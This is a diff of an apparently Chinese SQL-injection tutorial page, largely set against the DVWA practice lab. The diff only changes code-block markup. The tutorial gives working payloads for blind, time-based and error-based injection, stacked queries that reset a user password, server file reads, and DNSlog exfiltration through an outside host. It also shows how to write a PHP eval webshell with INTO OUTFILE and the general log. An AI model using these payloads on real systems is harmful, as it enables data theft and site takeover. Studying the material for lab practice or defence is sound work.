 <p>如果库名实在长，也可以使用<strong>二分法</strong>：</p>
-<pre tabindex="0"><code>1&#39; and length(database())&gt;4 #
-</code></pre><h4 id="猜测库名">猜测库名
-</h4><pre tabindex="0"><code>1&#39; and substring(database(),1,1)=&#39;d&#39; #
-</code></pre><p>如果不想使用<code>''</code>包裹字母，也可以转换成ascii码：</p>
-<pre tabindex="0"><code>1&#39; and ascii(substr(database(),1,1))=100 #
-</code></pre><p>一步步尝试，直到尝试出完整的数据库名称</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length(database())&gt;4 #
+</span></span></code></pre></div><h4 id="猜测库名">猜测库名
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and substring(database(),1,1)=&#39;d&#39; #
+</span></span></code></pre></div><p>如果不想使用<code>''</code>包裹字母，也可以转换成ascii码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ascii(substr(database(),1,1))=100 #
+</span></span></code></pre></div><p>一步步尝试，直到尝试出完整的数据库名称</p>
 <p>当然，我们在知道ascii码表的情况下，使用二分法更快：</p>
-<pre tabindex="0"><code>1&#39; and ascii(substr(database(),1,1))&gt;64 #
-</code></pre><p>如果substring被过滤了：<a class="link" href="#reverse&#43;left%e4%bb%a3%e6%9b%bfsubstring" >reverse+left代替substring
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ascii(substr(database(),1,1))&gt;64 #
+</span></span></code></pre></div><p>如果substring被过滤了：<a class="link" href="#reverse&#43;left%e4%bb%a3%e6%9b%bfsubstring" >reverse+left代替substring
     
 </a></p>
 <p>​				       <a class="link" href="#trim%e4%bb%a3%e6%9b%bfsubstring" >trim代替substring
@@ -1323,39 +1323,39 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 	
 ></p>
 <h4 id="猜测表的数量">猜测表的数量
-</h4><pre tabindex="0"><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2 #
-</code></pre><h4 id="猜测表2的长度">猜测表2的长度
-</h4><pre tabindex="0"><code>1&#39; and length((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1))=5#
-</code></pre><p>或者把length放在select后面：</p>
-<pre tabindex="0"><code>1&#39; and (select length(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1)=5#
-</code></pre><p><span style="color:red;font-size:20px"><strong>猜测表名，字段名等等的步骤都大同小异，在此不过多赘述</strong></span></p>
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2 #
+</span></span></code></pre></div><h4 id="猜测表2的长度">猜测表2的长度
+</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1))=5#
+</span></span></code></pre></div><p>或者把length放在select后面：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (select length(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1)=5#
+</span></span></code></pre></div><p><span style="color:red;font-size:20px"><strong>猜测表名，字段名等等的步骤都大同小异，在此不过多赘述</strong></span></p>
 <h3 id="时间盲注">时间盲注
 </h3><p>如果页面连exists这样的返回字样都没有怎么办？</p>
 <p>那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间</p>
 <h4 id="sleep延时">sleep延时
 </h4><p><mark><strong>利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：</strong></mark></p>
-<pre tabindex="0"><code>1&#39; and if(length(database())=4,sleep(5),1)#
-</code></pre><p><strong>注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(length(database())=4,sleep(5),1)#
+</span></span></code></pre></div><p><strong>注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空</strong></p>
 <p><strong>如果不用if，也是可以的：</strong></p>
-<pre tabindex="0"><code>1&#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
-</code></pre><p>页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
+</span></span></code></pre></div><p>页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4</p>
 <p>如果if函数被过滤了：[case when语句代替if](#case when语句代替if)</p>
 <h4 id="benchmark延时">benchmark延时
 </h4><p><mark><strong>benchmark(count, exp)：将表达式exp重复执行count次</strong></mark></p>
 <p>只要我们让执行次数够多，就能达到和sleep一样的延迟效果：</p>
-<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&#39;a&#39;)),1)#
-</code></pre><p>如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&#39;a&#39;)),1)#
+</span></span></code></pre></div><p>如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒</p>
 <h4 id="笛卡尔积延时">笛卡尔积延时
 </h4><p><strong><mark>当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：</mark></strong></p>
-<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
-</code></pre><p>这个查询将<code>information_schema.columns</code>这张表自身进行了两次连接，查询起来很费时（大概要两三秒）</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
+</span></span></code></pre></div><p>这个查询将<code>information_schema.columns</code>这张表自身进行了两次连接，查询起来很费时（大概要两三秒）</p>
 <p>如果感觉延时不够明显，可以多加几次自连接</p>
 <h4 id="正则匹配延时">正则匹配延时
 </h4><p><strong><mark>通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：</mark></strong></p>
-<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&#39;a&#39;,9999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)), 1)#
-</code></pre><p>我们来看看其中的正则延时部分是怎么工作的：</p>
-<pre tabindex="0"><code>select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&#39;a&#39;,9999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)), 1)#
+</span></span></code></pre></div><p>我们来看看其中的正则延时部分是怎么工作的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)
+</span></span></code></pre></div><ul>
 <li>
 <p><strong><code>rpad(str,len,padstr)</code>：用字符串<code>padstr</code>对<code>str</code>进行右边填补，直至它的长度达到<code>len</code>，然后返回 <code>str</code></strong></p>
 <p>​			         <strong>如果<code>str</code>的长度长于<code>len</code>，那么它将被截除到<code>len</code>个字符</strong></p>
@@ -1392,31 +1392,31 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </h4><p><strong><code>exp(x)</code>返回e的x次方，也就是e^x^</strong></p>
 <p>当传递给<code>exp()</code>的参数过大（在MySQL中约大于<strong>709</strong>）时，会产生数值越界错误</p>
 <p>我们可以通过位运算符<code>~</code>运算0获得一个巨大的整数：</p>
-<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
-</code></pre><p>我们知道，<code>~0</code>的结果是64位无符号整数的最大值，远大于709，因此<code>exp()</code>函数执行时必定会溢出报错：</p>
-<pre tabindex="0"><code>DOUBLE value is out of range in &#39;exp(~(0))&#39;
-</code></pre><p>你也可以选择手动输入一个很大的数字，比如exp(99999)</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
+</span></span></code></pre></div><p>我们知道，<code>~0</code>的结果是64位无符号整数的最大值，远大于709，因此<code>exp()</code>函数执行时必定会溢出报错：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DOUBLE value is out of range in &#39;exp(~(0))&#39;
+</span></span></code></pre></div><p>你也可以选择手动输入一个很大的数字，比如exp(99999)</p>
 <p><strong>同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：</strong></p>
-<pre tabindex="0"><code>1&#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
-</code></pre><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式为<code>exp(1*99999)</code>，也就是<code>exp(99999)</code>，就会报错</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
+</span></span></code></pre></div><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式为<code>exp(1*99999)</code>，也就是<code>exp(99999)</code>，就会报错</strong></p>
 <h4 id="cot">cot()
 </h4><p><strong><code>cot()</code>是余切三角函数，而众所周知，<code>cot(0)</code>是不存在的：</strong></p>
-<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
-</code></pre><p><strong>也可以不用if函数：</strong></p>
-<pre tabindex="0"><code>1&#39; and cot((ascii(substring(database(),1,1))=100)=0)#
-</code></pre><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式为<code>cot(1=0)</code>，也就是<code>cot(0)</code>，就会报错</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
+</span></span></code></pre></div><p><strong>也可以不用if函数：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and cot((ascii(substring(database(),1,1))=100)=0)#
+</span></span></code></pre></div><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式为<code>cot(1=0)</code>，也就是<code>cot(0)</code>，就会报错</strong></p>
 <h4 id="pow">pow()
 </h4><p><strong><code>pow(a,b)</code>函数用于求a^b^的值</strong>，相信你已经知道怎么做了：</p>
-<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
-</code></pre><p>不使用if函数：</p>
-<pre tabindex="0"><code>1&#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
-</code></pre><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式就是<code>pow(1+1,99999)</code>,也就是2^99999^，就会报错</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
+</span></span></code></pre></div><p>不使用if函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
+</span></span></code></pre></div><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式就是<code>pow(1+1,99999)</code>,也就是2^99999^，就会报错</strong></p>
 <h2 id="4-堆叠注入">#4 堆叠注入
 </h2><p>有些应用服务执行sql使用的不是<code>mysqli_query()</code>,而是<code>mysqli_multi_query()</code>方法，可以做到执行多条sql语句</p>
 <h3 id="普通多语句注入">普通多语句注入
 </h3><p><strong>如果又恰好没有过滤<code>;</code>，我们就能使用<code>;</code>分割语句，利用sql语句进行各种操作：</strong></p>
-<pre tabindex="0"><code>1&#39; union select 1,2;update users set password=123 where id=1--+
-</code></pre><p>这样就篡改了密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,2;update users set password=123 where id=1--+
+</span></span></code></pre></div><p>这样就篡改了密码</p>
 <p><strong>但能使用堆叠注入的场景一般都对语句做了过滤，尤其是select这样的核心查询语句，我们需要用别的来代替</strong></p>
 <h3 id="show查询">show查询
 </h3><h4 id="查询数据库名称">查询数据库名称
@@ -1474,8 +1474,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </h3><p><strong>利用<code>load_file</code>函数能做到对服务器文件的读取：</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#e06c75">load_file</span>(<span style="color:#98c379">&#34;D:\\1.txt&#34;</span>);
 </span></span></code></pre></div><p>配合注入语句，我们可以做到读取任意文件（当然前提是页面会有输出）：</p>
-<pre tabindex="0"><code>1&#39; union select 1,load_file(&#39;D:/WWW/1.txt&#39;) #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250707205449502.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,load_file(&#39;D:/WWW/1.txt&#39;) #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250707205449502.png"
 	
 	
 	
@@ -1497,15 +1497,15 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span></code></pre></div><p><strong>利用这一点，我们可以向服务器上传一句话木马</strong></p>
 <h4 id="union-select">union select
 </h4><p>最常用的写入方式，在select内容中插入一句话木马</p>
-<pre tabindex="0"><code>1&#39; union select 1,&#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; into outfile &#39;D:/WWW/114514.php&#39; #
-</code></pre><img src="http://picture.928330.xyz/typora/image-20250707205900643.png" alt="image-20250707205900643"  />
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,&#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; into outfile &#39;D:/WWW/114514.php&#39; #
+</span></span></code></pre></div><img src="http://picture.928330.xyz/typora/image-20250707205900643.png" alt="image-20250707205900643"  />
 <p>虽然报错，但是文件也写入成功了：</p>
 <img src="http://picture.928330.xyz/typora/image-20250707205828237.png" alt="image-20250707205828237"  />
 <p><strong>接着就可以使用蚁剑等工具接管网站</strong></p>
 <h4 id="lines-terminated-by">lines terminated by
 </h4><p><strong><code>lines terminated by</code>用来定义导出的文件中每行数据以什么字符结尾（默认是换行符 <code>\n</code>）：</strong></p>
-<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708141833937.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250708141833937.png"
 	
 	
 	
@@ -1517,8 +1517,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 ></p>
 <h4 id="lins-starting-by">lins starting by
 </h4><p><strong>与上一种相反，它控制的是每一行开始位置的内容：</strong></p>
-<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines starting by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708141731385.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines starting by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250708141731385.png"
 	
 	
 	
@@ -1530,8 +1530,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 ></p>
 <h4 id="fields-terminated-by">fields terminated by
 </h4><p><strong><code>fields terminated by</code>控制的是一行数据中，各个字段（列）之间的分隔符：</strong></p>
-<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; fields terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708142123580.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; fields terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250708142123580.png"
 	
 	
 	
@@ -1543,14 +1543,14 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 ></p>
 <h4 id="columns-terminated-by">columns terminated by
 </h4><p><strong>是上一种的同义词，作用完全一样：</strong></p>
-<pre tabindex="0"><code>1&#39; into outfile &#39;D:/WWW/114514.php&#39; columns terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
-</code></pre><h3 id="日志文件写入">日志文件写入
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; columns terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
+</span></span></code></pre></div><h3 id="日志文件写入">日志文件写入
 </h3><p>如果mysql无法更改导出文件路径，或者根本不允许导出路径，我们还可以通过日志文件注入</p>
 <p><strong>写入的前提是要开启<code>general log</code>或者<code>slow_query_log</code>模式，并设置目录地址</strong></p>
 <p><strong>下面用<code>general log</code>做演示</strong></p>
 <p><strong>查看配置：</strong></p>
-<pre tabindex="0"><code>show variables like &#39;%general%&#39;
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708165305034.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>show variables like &#39;%general%&#39;
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250708165305034.png"
 	
 	
 	
@@ -1561,10 +1561,10 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 	
 ></p>
 <p><strong>开启<code>general log</code>模式：</strong></p>
-<pre tabindex="0"><code>set global general_log = on;   
-</code></pre><p><strong>设置目录地址：</strong></p>
-<pre tabindex="0"><code>set global general_log_file = &#39;D:/WWW/114514.php&#39;;
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250708165642906.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>set global general_log = on;   
+</span></span></code></pre></div><p><strong>设置目录地址：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>set global general_log_file = &#39;D:/WWW/114514.php&#39;;
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250708165642906.png"
 	
 	
 	
@@ -1602,8 +1602,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 ></p>
 <h3 id="构造注入payload">构造注入Payload
 </h3><p>我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是上文提到过的<code>load_file()</code>：</p>
-<pre tabindex="0"><code>1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.624elh.dnslog.cn\\a&#39;))#
-</code></pre><p>当数据库执行这个Payload时，它会尝试使用<code>load_file()</code>去读取一个网络路径</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.624elh.dnslog.cn\\a&#39;))#
+</span></span></code></pre></div><p>当数据库执行这个Payload时，它会尝试使用<code>load_file()</code>去读取一个网络路径</p>
 <p><code>concat()</code>函数会将各部分拼接起来，构造出一个完整的UNC路径：<code>\\dvwa.624elh.dnslog.cn\a</code></p>
 <p><strong>为了访问这个网络路径，服务器的操作系统必须先解析主机名 <code>dvwa.624elh.dnslog.cn</code>，因此它会向DNS服务器发起一个DNS查询请求</strong></p>
 <p><strong>回到DNSlog，点击<code>Refresh Record</code>，将会显示出dns解析记录</strong></p>
@@ -1629,8 +1629,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql</span>);
 </span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
 </span></span></code></pre></div><p>我们一般是在查询输入框中输入注入语句，其实也可以在url中：</p>
-<pre tabindex="0"><code>http://example.com/get_vuln.php?id=1&#39; UNION SELECT 1, user, password FROM users#
-</code></pre><p>id后面其实就是我们之前在输入框中输入的内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://example.com/get_vuln.php?id=1&#39; UNION SELECT 1, user, password FROM users#
+</span></span></code></pre></div><p>id后面其实就是我们之前在输入框中输入的内容</p>
 <p><strong>==POST请求（登录等）：==</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$username</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;username&#39;</span>];
@@ -1689,8 +1689,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span></code></pre></div><p>dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie</p>
 <p>在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样</p>
 <p>我们点击链接更换新cookie：</p>
-<pre tabindex="0"><code>1&#39; and length(database())=4 #
-</code></pre><p><strong>刷新页面</strong>，页面显示<code>User ID exists in the database.</code>，说明查询成功了，也就是数据库名称长度为4</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length(database())=4 #
+</span></span></code></pre></div><p><strong>刷新页面</strong>，页面显示<code>User ID exists in the database.</code>，说明查询成功了，也就是数据库名称长度为4</p>
 <p>值得注意的是，这段代码里还有这样的一段：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#c678dd">if</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">0</span>, <span style="color:#d19a66">5</span> ) <span style="color:#56b6c2">==</span> <span style="color:#d19a66">3</span> ) {
 </span></span><span style="display:flex;"><span>            <span style="color:#e06c75">sleep</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">2</span>, <span style="color:#d19a66">4</span> ) );
@@ -1755,8 +1755,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 <p>但是，空格有很多的绕过方式</p>
 <h3 id="注释绕过">注释绕过
 </h3><p>在大多数的数据库（特别是mysql）中，<strong>注释<code>/**/</code>能够代替空格</strong>：</p>
-<pre tabindex="0"><code>1&#39;/**/union/**/select/**/1,database()#
-</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250628203003878.png"
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39;/**/union/**/select/**/1,database()#
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250628203003878.png"
 	
 	
 	
@@ -1786,8 +1786,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </ul>
 <p>虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用</p>
 <p>制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：</p>
-<pre tabindex="0"><code>1&#39;%0dunion%0dselect%0d1,database()#
-</code></pre><h3 id="括号绕过">括号绕过
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39;%0dunion%0dselect%0d1,database()#
+</span></span></code></pre></div><h3 id="括号绕过">括号绕过
 </h3><h4 id="数字型">数字型
 </h4><p>mysql数据库有这样一个特性：</p>
 <ul>
@@ -1799,8 +1799,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </li>
 </ul>
 <p>结合substring()，我们就能构造出下面的不带有空格注入：</p>
-<pre tabindex="0"><code>1=(ascii(substring(database(),1,1))=100)
-</code></pre><p><strong>如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1=(ascii(substring(database(),1,1))=100)
+</span></span></code></pre></div><p><strong>如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的</strong></p>
 <p>这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入</p>
 <h4 id="字符型数字型">字符型&amp;数字型
